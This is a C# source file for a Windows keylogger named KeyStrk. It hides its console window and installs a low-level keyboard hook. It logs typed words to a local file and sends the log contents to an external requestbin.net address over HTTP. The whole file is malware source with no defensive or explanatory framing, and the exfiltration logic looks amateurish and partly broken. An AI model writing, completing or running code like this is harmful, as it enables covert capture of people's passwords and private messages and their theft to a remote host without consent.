﻿using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Net;

namespace KeyStrk
{
    class Program
    {

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static String wordData = "";
        private static float startTime = 0f;

        public static void Main()
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
            sw.Close();

            var handle = GetConsoleWindow();

            // Hide Console 
            ShowWindow(handle, SW_HIDE);

            // ??

            Thread hookThread = new Thread(HookInput);
            // Thread sendData = new Thread(sendThread);

            hookThread.Start();
            StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/tzdsaytz?" + sr.ReadLine());
            sr.Close();
            req.GetResponse();


        }

        private static void HookInput()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Where the loggin happens 
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
             
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                
                // Split the input in to sepate words;
                if ((Keys)vkCode == Keys.Enter || (Keys)vkCode == Keys.Space || (Keys)vkCode == Keys.Oemcomma || (Keys)vkCode == Keys.OemPeriod)
                {
                    StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);

                    sw.Write(wordData + " ");
                    wordData = "";
                    sw.Close();

                }
                else
                {
                    wordData += (Keys)vkCode;
                }




            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Some dll shit i dont understand 
        /// </summary>
        /// <param name="idHook"></param>
        /// <param name="lpfn"></param>
        /// <param name="hMod"></param>
        /// <param name="dwThreadId"></param>
        /// <returns></returns>

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

    }
}